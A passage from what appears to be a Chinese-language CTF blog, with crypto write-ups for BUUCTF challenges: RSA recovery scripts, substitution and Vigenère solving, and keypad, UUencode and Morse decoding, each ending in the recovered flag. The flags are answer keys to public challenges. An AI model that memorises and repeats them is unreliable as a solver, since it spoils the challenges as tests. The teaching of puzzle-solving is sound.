stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(e*d-1)%((p-1)(q-1))=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>進行爆破，得到phi，也就是(p-1)(q-1)，因為p, q差異不大，對phi開根號就可以求出p, q。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy.crypto</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line"></span><br><span class="line">ed1 = e * d - <span class="number">1</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">q = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>), <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">16</span>)):</span><br><span class="line">    <span class="keyword">if</span> ed1 % k == <span class="number">0</span>:</span><br><span class="line">        p = sympy.prevprime(gmpy2.iroot(ed1 // k, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">        q = sympy.nextprime(p)</span><br><span class="line">        <span class="keyword">if</span> (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * k == ed1:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;NCTF&#123;70u2_nn47h_14_v3ry_gOO0000000d&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="roarctf2019rsa"><a class="markdownIt-Anchor" href="#roarctf2019rsa"></a> [RoarCTF2019]RSA</h3><p>題目給定如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x</span><br><span class="line">p=next_prime(z*x*y)</span><br><span class="line">q=next_prime(z)</span><br><span class="line">A =  2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724</span><br><span class="line">n =  117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span><br><span class="line">c =  41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span><br></pre></td></tr></table></figure><p>依照慣例，n可以透過factordb分解成p和q。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778</span><br><span class="line">986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987</span><br><span class="line">153078156389470370195514285850736541078623854327959382156753458569</span><br><span class="line">q = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499</span><br><span class="line">311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169</span><br><span class="line">867410973960652081452455371451222265819051559818441257438021073941183</span><br></pre></td></tr></table></figure><p>解密所需要的c, d, n只剩下c沒有辦法找出來，使用爆破的方式來做。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line">c = <span class="number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183</span></span><br><span class="line">q = <span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(e):</span><br><span class="line">            d = invert(e, phi)</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">            flag = <span class="built_in">str</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;CTF&#123;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;e =&#x27;</span>, e)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 65537 </span><br><span class="line">b&#x27;RoarCTF&#123;wm-l1l1ll1l1l1l111ll&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="afctf2018single"><a class="markdownIt-Anchor" href="#afctf2018single"></a> [AFCTF2018]Single</h3><p>題目給了兩個檔案，一個是密文，一個是Encode.cpp。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;Plain.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;Cipher.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,stdout);</span><br><span class="line">map&lt;<span class="type">char</span>, <span class="type">char</span>&gt; f;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">26</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;++i)&#123;</span><br><span class="line">arr[i]=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">random_shuffle</span>(arr,arr+<span class="number">26</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;++i)&#123;</span><br><span class="line">f[<span class="string">&#x27;a&#x27;</span>+i]=<span class="string">&#x27;a&#x27;</span>+arr[i];</span><br><span class="line">f[<span class="string">&#x27;A&#x27;</span>+i]=<span class="string">&#x27;A&#x27;</span>+arr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="keyword">while</span>((ch=<span class="built_in">getchar</span>())!=EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(f.<span class="built_in">count</span>(ch))&#123;</span><br><span class="line"><span class="built_in">putchar</span>(f[ch]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jmqrida rva Lfmz (JRL) eu m uqajemf seny xl enlxdomrexn uajiderc jxoqarerexnu. Rvada mda rvdaa jxooxn rcqau xl JRLu: Paxqmdyc, Mrrmjs-Yalanja mny oekay.</span><br><span class="line"></span><br><span class="line">Paxqmdyc-urcfa JRLu vmu m jxiqfa xl giaurexnu (rmusu) en dmnza xl jmrazxdeau. Lxd akmoqfa, Wab, Lxdanuej, Jdcqrx, Benmdc xd uxoarvenz afua. Ramo jmn zmen uxoa qxenru lxd atadc uxftay rmus. Oxda qxenru lxd oxda jxoqfejmray rmusu iuimffc. </span><br><span class="line"></span><br><span class="line">Rva nakr rmus en jvmen jmn ba xqanay xnfc mlrad uxoa ramo uxfta qdatexiu rmus. Rvan rva zmoa reoa eu xtad uio xl qxenru uvxwu cxi m JRL wenad. Lmoxiu akmoqfa xl uijv JRL eu Yaljxn JRL gimfu.</span><br><span class="line"></span><br><span class="line">Waff, mrrmjs-yalanja eu mnxrvad enradaurenz seny xl jxoqarerexnu. Vada atadc ramo vmu xwn narwxds(xd xnfc xna vxur) werv tifnmdmbfa uadtejau. Cxid ramo vmu reoa lxd qmrjvenz cxid uadtejau mny yatafxqenz akqfxeru iuimffc. Ux, rvan xdzmnehadu jxnnajru qmdrejeqmnru xl jxoqarerexn mny rva wmdzmoa urmdru! Cxi uvxify qdxrajr xwn uadtejau lxd yalanja qxenru mny vmjs xqqxnanru lxd mrrmjs qxenru. </span><br><span class="line"></span><br><span class="line">Veurxdejmffc rveu eu m ledur rcqa xl JRLu, atadcbxyc snxwu mbxir YAL JXN JRL - uxoarvenz fesa m Wxdfy Jiq xl mff xrvad jxoqarerexnu.Oekay jxoqarerexnu omc tmdc qxuuebfa lxdomru. Er omc ba uxoarvenz fesa wmdzmoa werv uqajemf reoa lxd rmus-bmuay afaoanru (a.z. IJUB eJRL).</span><br><span class="line"></span><br><span class="line">JRL zmoau xlran rxijv xn omnc xrvad muqajru xl enlxdomrexn uajiderc: jdcqrxzdmqvc, urazx, benmdc mnmfcueu, datadua anzanaadenz, oxbefa uajiderc mny xrvadu. Zxxy ramou zanadmffc vmta urdxnz useffu mny akqadeanja en mff rvaua euuiau.</span><br><span class="line"></span><br><span class="line">Iuimffc, lfmz eu uxoa urdenz xl dmnyxo ymrm xd rakr en uxoa lxdomr. </span><br><span class="line"></span><br><span class="line">Akmoqfa mljrl&#123;Xv_I_lxiny_er_neja_rDc&#125;</span><br></pre></td></tr></table></figure><p>詞頻分析直接丟 <a href="https://quipqiup.com/%EF%BC%8C%E6%8A%8A%E5%8E%9F%E6%96%87%E7%BF%BB%E8%AD%AF%E5%87%BA%E4%BE%86%E3%80%82">https://quipqiup.com/，把原文翻譯出來。</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vhecowis hmwbwjeny dwv hcjvr saeys. Srbkeh Kwevwb.Capture the Flag (CTF) is a special kind of information security competitions. There are three common types of CTFs: Jeopardy, Attack-Defence and mixed. </span><br><span class="line"></span><br><span class="line">Jeopardy-style CTFs has a couple of questions (tasks) in range of categories. For example, Web, Forensic, Crypto, Binary or something else. Team can gain some points for every solved task. More points for more complicated tasks usually. </span><br><span class="line"></span><br><span class="line">The next task in chain can be opened only after some team solve previous task. Then the game time is over sum of points shows you a CTF winer. Famous example of such CTF is Defcon CTF quals. </span><br><span class="line"></span><br><span class="line">Well, attack-defence is another interesting kind of competitions. Here every team has own network(or only one host) with vulnarable services. Your team has time for patching your services and developing exploits usually. So, then organizers connects participants of competition and the wargame starts! You should protect own services for defence points and hack opponents for attack points. </span><br><span class="line"></span><br><span class="line">Historically this is a first type of CTFs, everybody knows about DEF CON CTF - something like a World Cup of all other competitions. Mixed competitions may vary possible formats. It may be something like wargame with special time for task-based elements (e.g. UCSB iCTF). </span><br><span class="line"></span><br><span class="line">CTF games often touch on many other aspects of information security: cryptography, stego, binary analysis, reverse engeneering, mobile security and others. Good teams generally have strong skills and experience in all these issues. Usually, flag is some string of random data or text in some format.</span><br><span class="line"></span><br><span class="line">Example afctf&#123;Oh_U_found_it_nice_tRy&#125;</span><br></pre></td></tr></table></figure><h3 id="bjdctf2020signin"><a class="markdownIt-Anchor" href="#bjdctf2020signin"></a> [BJDCTF2020]signin</h3><p>題目如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">424a447b57653163306d655f74345f424a444354467d</span><br></pre></td></tr></table></figure><p>看起來是hex，轉成base64之後，發現還是亂碼，改轉成ascii之後得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BJD&#123;We1c0me_t4_BJDCTF&#125;</span><br></pre></td></tr></table></figure><h3 id="mrctf2020vigenere"><a class="markdownIt-Anchor" href="#mrctf2020vigenere"></a> [MRCTF2020]vigenere</h3><p>密文</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g vjganxsymda ux ylt vtvjttajwsgt bl udfteyhfgt</span><br><span class="line">oe btlc ckjwc qnxdta </span><br><span class="line">vbbwwrbrtlx su gnw nrshylwmpy cgwps, lum bipee ynecgy gk jaryz frs fzwjp, x puej jgbs udfteyhfgt, gnw sil uuej su zofi. sc okzfpu bl lmi uhzmwi, x nyc dsj bl lmi enyl ys argnj yh nrgsi. nba swi cbz ojprbsw fqdam mx. cdh nsai cb ygaigroysxn jnwwi lr msylte.</span><br><span class="line">cw mekr tg jptpzwi kdikjsqtaz, ftv pek oj pxxkdd xd ugnj scr, yg n esqxwxw nba onxw au ywipgkj fyiuujnxn gnss xwnz onxw jnahl avhwwxn vzkjpu nrofch fvwfoh. v jwhppek lmi vyutfp hbiafp hcguj at nxw gyxyjask ib hw seihxsqpn vtvjttajwsx ds zzj xnegfsmtf egz wtrq lt mbcukj sc hy. qty wnbw ss bbxsq vxtnl ys ghrw zw cbx vt cdh vgxwtfy ssc brzzthh bl wsjdeiwricg cw mekr zjzi grgktr ib lwfv.</span><br><span class="line">vbbwwrbrtlx hteonj xwroj oyhg vgbigf ljtq iuk utrhrtl tj iuk ytztetwi. cdh nsai crolmig fudngxgkv ssg ekujmkrj gzvh. jk vnh cbz aszxgk qty. nba vt rdg qfta jf, tgw hd lum prdj umw aderv. hcqrxkuerr jgjw cbz dni lvzznr nbaj gsgqkjx. hd aul ylxaq lmei lum hec oaaqh xg, gk yldhmz nx lrxw f tjorah gdaylwyrgogs tgbpwhx. nba ufrcbz. ay mh nt shx ds tsyygr gfi mi txgbw xgywqj iuxgzkw baj hsaykuymkr guymday.</span><br><span class="line">qty wnbw ssi rtyfktq of tyg txwfx paj yfxwrxask rbtnjvhnzatr, cbx vnh nba uwipgk lmi lrgdyl ds umw qpeqwytaniwx. cdh jg ssi xtgb sje imqxjek, gzv tgnahw, de zzj ycjxayxta igiih gnsy eaeksic eeunnht baj xsrvkld qdek gwhte zzfr rbadi ft bhlfmcrj td ecl ux dsje oeushvzatrh.</span><br><span class="line">lum hppvs lmigr gjj tgbhdjqh nsgsk jf zzfx nba fjis gu ktpkr. egz yhr zznw rygar eh nt wcgjfk lt mcigvj sje vjjgxailx. qpae gk xwryw uvdorwrw sbt&#x27;l jbxfz. omigr zzjvt nxw wipy igsjavilx, awrxw yltek swi leuflw, lr caqp xqkfymul zzjq paj sihgryk yltz hq tyg zkssw. lr gjj jdesask dhx gbr hbiafp rbtlwerg. zznw vbbwwrpaiw bmay gjnwt niutvsvty ys iuk utrsvzatrh bl gzv lbxdi, rdg egzvh. baj bsgyj ax hxslwwicg.</span><br><span class="line">iqgigfvshi rbtknwif ux yvpayshxxbtk, wianzatrhuohx, ecq zztyvuz aywtyl, swvplkv qmzr g kyecqofl apik as xwr cwg su baj hsbzafngpgogsw. dhxk nw p jujqh iugl nw qbzz jzteeomigr gfi rdjnwwi, qhz ay mh aul bltek tthxry dnzt.</span><br><span class="line">jk swi reksymct g otvaq zzfx pyr efc tazww axgngzx eeonnpttk gw tgrpmimrr guhsgqkv gc gniw, jgdaueng ebcww, qxyolfvn sujhi, de ylfxxbt gk fxezz.</span><br><span class="line">bi pek uwipgofl e lbxdi awrxw frnbtw, frnjnwwi bne wctgryk mmh bx zjv qrrajjh, au efxirx zta hvtyzppe, cayldhz xjeg bl tjmct igjvrrj asxd fodjrrr uj hscsujrmil.</span><br><span class="line">egzv armsq gdaiwuxh bl hwserxld, imcxwxwxbt, aiicgold, qdikejri, ntv hscgkpy hd aul fteye lt yh. gnwd egr gdq fpfkv tr bnzljv, paj lmigr ok ss bnzljv wrxw.</span><br><span class="line">tyg vjwsxxgowx lpik ft fdqowx, wd, htdnot lum, bi rntftx dozsnr dejww fn cnqxmrnr utigpogs. at okdnikr zzfx ueue jxwvik, jravmzyicrj kjpu-vtljvtfz, ssh iuk utqbbtojea, baj lskrxffrrr caqp tzkjli. dhx aiicgolnih zgq gi svylwmqhzwi ereukx qpae gk cdhx bzvxfjahxxbtk. ylt btdd ppj zzfx pyr gzv rbtkymihkfy gjyzmwih jumqh vrtwweaye jjgdttaei xf zzj kdyjws vjyk. oj ldck oj axyr tj eqyk lt fjvrv tyg cgjymrhrsw wdyalnscf uf ylpg hsxmh. oal bi rntftx ppiwux iuk ktpjgogsw nba swi pgzwrtivty ys xzvgxi.</span><br><span class="line">xa zzj ycvzwi winzwx, cdh nsai ibjsd ggrgljh p ygo, ylt gkdjgdzsmsmrnzatrh ekxtvb nil, blxpn jjtjqosyih lumw sla igswivzmymda gfi mcfadyw iuk vwipzy gk ntslwwwda, csxlxamltr, bvrd, resvygs, htguizikvrdj, ecq hjfrsrok. yltfk vwipzy ezwi auo gi qbxf frtj of zw.</span><br><span class="line">nba swi irxjnjxrj gk cdhx gbr ruodivta, yasgt gnwd egr tsymkry as e lbxdi awrxw dsj jodq eajgqx ft vsenkgntlx. ftpgmxi nba xjeg gnwr, cdh kfyvjfz qtyg oajjejpxshmtf cayl iuk hfvtazsq vtfvgswxoodnxxry qty pek lts rbcswhal zg hscsxgsx nbajxiaikk. nr dhx otvaq, gdq xwr ywsxxzkfyw paj wctgryknscf ux mybntayc, ueue ylt qktfwxam lt xwr gfliavi, swi enxlx su n ywfqaryk bldyk, lmi vyutfp rbtnjvhnzatr ds hayw. lr issrdg ywuegnzw ylt noj ylpg iztotf ljtq iuk snv jcuf blxpn onrvf hwfx.</span><br><span class="line">xa iznrp, tkjrecl, ljfrrr, xmxwxn, yaskpcujj, minrq frs gnw zrxgkv xxpgkk, dsj nxw yvnvty ys lnxv tju gnw amghy gk pxokjyc ql kjjgivty lypej htwif gl ylt sxgsxxrxk tj rlhwwweniw. yltfk efc zrkh tyi gnw hscggynsc suj f wbnrd ymbr, hmy xwre onpa aul bsgx of f aderv ylpg caqp hbuf gi qygfpiirj as fxg-hwfvxam ejhxn.</span><br><span class="line">egzv xaijjehvtyqc doygqiir ofksgzglnsc vtvzwieowx adhrv uigcklzeir zzjqhrrnjw ql vjttdfofl ppjy, as ebrxahe paj wqwtjnwwi, iugl hppvs lt sla yhjiru olxias zzwsjtngzx iuk otvaq. zzjwt ygox adhrv iirygjj msrgk ys qr gftxwrx ashjfzjnea cxgiyrg, tg rsgr tggpt gnss txt ojtr. xa umw aderv, blpgknjv iuk zzqpa sash bne uwipgk ufr qr xwuvdqaujh paj vnwieotzxtq ofkmcvzwqc pg tg hshg. zzj kabhsq gdabwdecpk gk xwbaymx cb rgskte xwvyxekk dsje lshxdeowx xd niutqeyokm.</span><br><span class="line">xwryw nrreksxmctrq mshgodj ecq igqscvgd ripfajjw eyguj yh vt lmi hnsw ushvzatr pf zztwt cxwamdhy dtztey gk jgrkvtq paj kjpu-qkljvbvtsymda czt lpq zg wiyril ylt nalmsgvzajw ds jaxxpaz, msmcsujris cuojvh. jk ezwi qkuqegr umw zxezmfp hrrnjw xzsmsi ib egzv hbbwwixttld, ikrt sx at pufymchk lt gdaywsx ib egzv ghrw tzte umw fdqowx. at jodq weeksi sjeywqztf guwshf zzj tantwy wd gnsy rd btw hec nxjjwi baj yldhmzyw.</span><br><span class="line">lr caqp reksyi p ponnpxmglnsc bl lmi bvtv nr rlhwwweniw. ren vz tj qdek zzqpak ssh unoj ylpa zzj aderv dsje mgaigaswsxh ugnj qpqk tjjdek.</span><br><span class="line">xqev vy ewgis balicrxw hvnczg hvppq efr, eyksxi pqj mshteyutvt ntv hygye twerry.</span><br></pre></td></tr></table></figure><p>根據加密方式看出是vigenere之後，丟進 <a href="https://guballa.de/vigenere-solver">https://guballa.de/vigenere-solver</a> 之後得到原文，key是gsfepn。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a declaration of the independence of cyberspace</span><br><span class="line">by john perry barlow </span><br><span class="line">governments of the industrial world, you weary giants of flesh and steel, i come from cyberspace, the new home of mind. on behalf of the future, i ask you of the past to leave us alone. you are not welcome among us. you have no sovereignty where we gather.</span><br><span class="line">we have no elected government, nor are we likely to have one, so i address you with no greater authority than that with which liberty itself always speaks. i declare the global social space we are building to be naturally independent of the tyrannies you seek to impose on us. you have no moral right to rule us nor do you possess any methods of enforcement we have true reason to fear.</span><br><span class="line">governments derive their just powers from the consent of the governed. you have neither solicited nor received ours. we did not invite you. you do not know us, nor do you know our world. cyberspace does not lie within your borders. do not think that you can build it, as though it were a public construction project. you cannot. it is an act of nature and it grows itself through our collective actions.</span><br><span class="line">you have not engaged in our great and gathering conversation, nor did you create the wealth of our marketplaces. you do not know our culture, our ethics, or the unwritten codes that already provide our society more order than could be obtained by any of your impositions.</span><br><span class="line">you claim there are problems among us that you need to solve. you use this claim as an excuse to invade our precincts. many of these problems don&#x27;t exist. where there are real conflicts, where there are wrongs, we will identify them and address them by our means. we are forming our own social contract. this governance will arise according to the conditions of our world, not yours. our world is different.</span><br><span class="line">cyberspace consists of transactions, relationships, and thought itself, arrayed like a standing wave in the web of our communications. ours is a world that is both everywhere and nowhere, but it is not where bodies live.</span><br><span class="line">we are creating a world that all may enter without privilege or prejudice accorded by race, economic power, military force, or station of birth.</span><br><span class="line">we are creating a world where anyone, anywhere may express his or her beliefs, no matter how singular, without fear of being coerced into silence or conformity.</span><br><span class="line">your legal concepts of property, expression, identity, movement, and context do not apply to us. they are all based on matter, and there is no matter here.</span><br><span class="line">our identities have no bodies, so, unlike you, we cannot obtain order by physical coercion. we believe that from ethics, enlightened self-interest, and the commonweal, our governance will emerge. our identities may be distributed across many of your jurisdictions. the only law that all our constituent cultures would generally recognize is the golden rule. we hope we will be able to build our particular solutions on that basis. but we cannot accept the solutions you are attempting to impose.</span><br><span class="line">in the united states, you have today created a law, the telecommunications reform act, which repudiates your own constitution and insults the dreams of jefferson, washington, mill, madison, detoqueville, and brandeis. these dreams must now be born anew in us.</span><br><span class="line">you are terrified of your own children, since they are natives in a world where you will always be immigrants. because you fear them, you entrust your bureaucracies with the parental responsibilities you are too cowardly to confront yourselves. in our world, all the sentiments and expressions of humanity, from the debasing to the angelic, are parts of a seamless whole, the global conversation of bits. we cannot separate the air that chokes from the air upon which wings beat.</span><br><span class="line">in china, germany, france, russia, singapore, italy and the united states, you are trying to ward off the virus of liberty by erecting guard posts at the frontiers of cyberspace. these may keep out the contagion for a small time, but they will not work in a world that will soon be blanketed in bit-bearing media.</span><br><span class="line">your increasingly obsolete information industries would perpetuate themselves by proposing laws, in america and elsewhere, that claim to own speech itself throughout the world. these laws would declare ideas to be another industrial product, no more noble than pig iron. in our world, whatever the human mind may create can be reproduced and distributed infinitely at no cost. the global conveyance of thought no longer requires your factories to accomplish.</span><br><span class="line">these increasingly hostile and colonial measures place us in the same position as those previous lovers of freedom and self-determination who had to reject the authorities of distant, uninformed powers. we must declare our virtual selves immune to your sovereignty, even as we continue to consent to your rule over our bodies. we will spread ourselves across the planet so that no one can arrest our thoughts.</span><br><span class="line">we will create a civilization of the mind in cyberspace. may it be more humane and fair than the world your governments have made before.</span><br><span class="line">flag is mrctf vigenere crypto crack man, please add underscore and curly braces.</span><br></pre></td></tr></table></figure><p>關鍵句是flag is mrctf vigenere crypto crack man，開始嘗試提交，flag{vigenere_crypto_crack_man}就是答案了。</p><h3 id="mrctf2020keyboard"><a class="markdownIt-Anchor" href="#mrctf2020keyboard"></a> [MRCTF2020]keyboard</h3><p>題目如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">得到的flag用</span><br><span class="line">MRCTF&#123;xxxxxx&#125;形式上叫</span><br><span class="line">都为小写字母</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line">666</span><br><span class="line">22</span><br><span class="line">444</span><br><span class="line">555</span><br><span class="line">33</span><br><span class="line">7</span><br><span class="line">44</span><br><span class="line">666</span><br><span class="line">66</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>先用鍵盤打打看，沒有頭緒，後來想到手機簡訊按鍵，就打開手機對照，打出mobilephond，提交失敗後查詢一下，發現應該是mobile phone，就成功了。</p><p>flag{mobilephone}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF crypto 2</title>
      <link href="/ctf-crypto-buuctf-2/"/>
      <url>/ctf-crypto-buuctf-2/</url>
      
        <content type="html"><![CDATA[<h2 id="buuctf"><a class="markdownIt-Anchor" href="#buuctf"></a> BUUCTF</h2><h3 id="unencode"><a class="markdownIt-Anchor" href="#unencode"></a> Unencode</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]</span><br></pre></td></tr></table></figure><p><a href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a> 用UTF-8 decoder，得到flag。</p><h3 id="afctf2018morse"><a class="markdownIt-Anchor" href="#afctf2018morse"></a> [AFCTF2018]Morse</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-..../.----/-..../-..../-..../...--/--.../....-/-..../-..../--.../-.../...--/.----/--.../...--/..---/--.../--.../....-/...../..-./--.../...--/...--/-----/...../..-./...--/...--/...--/....-/...--/...../--.../----./--.../-..</span><br></pre></td></tr></table></figure><p>感覺就是摩斯密碼，透過 <a href="http://moersima.00cha.net/cn.asp">http://moersima.00cha.net/cn.asp</a> 轉換成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">61666374667b317327745f73305f333435797d</span><br></pre></td></tr></table></figure><p>再將hex to ascii，得到flag。</p><h3 id="robomunication"><a class="markdownIt-Anchor" href="#robomunication"></a> robomunication</h3><p>題目是一段mp3，聽到耳朵死掉，本來以為是長短音，沒想到是逼啵。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">…. . .-.. .-.. — .– …. .- - .. … - …. . -.- . -.– .. - .. … -… — — .–. -… . . .–.</span><br></pre></td></tr></table></figure><p>翻譯一下變成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 